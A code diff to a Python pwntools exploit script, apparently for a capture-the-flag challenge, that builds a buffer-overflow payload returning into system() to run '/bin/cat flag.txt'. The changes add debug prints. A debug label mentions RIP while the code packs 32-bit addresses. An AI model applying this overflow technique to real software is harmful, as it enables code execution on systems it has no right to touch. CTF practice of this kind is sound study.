@@ -21,17 +21,20 @@ def exploit(binary_path):
     # Get the address of the system function
     system_addr = elf.symbols["system"]
 
-    # Find the offset of the "/bin/cat flag.txt" string
+    # Find the address of the "/bin/cat flag.txt" string
     string_addr = next(elf.search(b'/bin/cat flag.txt'))
+    print("[DEBUG] The address of the /bin/cat flag.txt string is " + str(hex(string_addr)))
 
     # Get the offset by calling the find_offset function
     offset = find_offset(binary_path)
+    print("[DEBUG] The offset calculated overwrite RIP is " + str(offset) + " bytes")
 
     # Construct the payload
     payload = b'A' * offset
     payload += p32(system_addr)
     payload += p32(0x0)
     payload += p32(string_addr)
+    print("[DEBUG] The payload will be " + ''.join('\\x{:02x}'.format(x) for x in payload))
 
     # Send the payload and print the output
     io.sendline(payload)
